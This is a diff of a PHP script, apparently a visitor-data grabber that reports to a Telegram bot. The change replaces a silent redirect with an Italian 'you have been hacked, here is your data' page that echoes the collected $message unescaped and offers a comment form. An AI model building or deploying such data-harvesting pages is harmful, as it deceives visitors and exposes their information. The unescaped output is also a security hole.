@@ -62,9 +62,28 @@ if ($res !== null){
         (int)$first_message['result']['message_id']
 	);
 }
-
-header("Location: $website_redirection");
-die();
-
-
 ?>
+<html>
+  <head>
+  	<title>Attacco hacker</title>
+  </head>
+  <body>
+  	<div align="center" style="background-color:black">
+  	<font color="lightgreen" size="6">
+  	<h1>SEI STATO HACKERATO: </h1>
+    <hr width="50%" />
+    <h2>ecco i tuoi dati: </h2>
+    <?php echo nl2br($message); ?>
+    <hr width="50%"/>
+    <h3>Inviaci un commento</h3>
+    <form action="comment.php" method="get"> 
+    	Nome: <input type="text" name="nome" /><br />
+        Commento: <textarea name="commento"></textarea><br />
+        <input type="submit" name="invia" value="invia" /><br />
+    </form>
+    </font>
+    </div>
+  </body>
+</html>
+
+
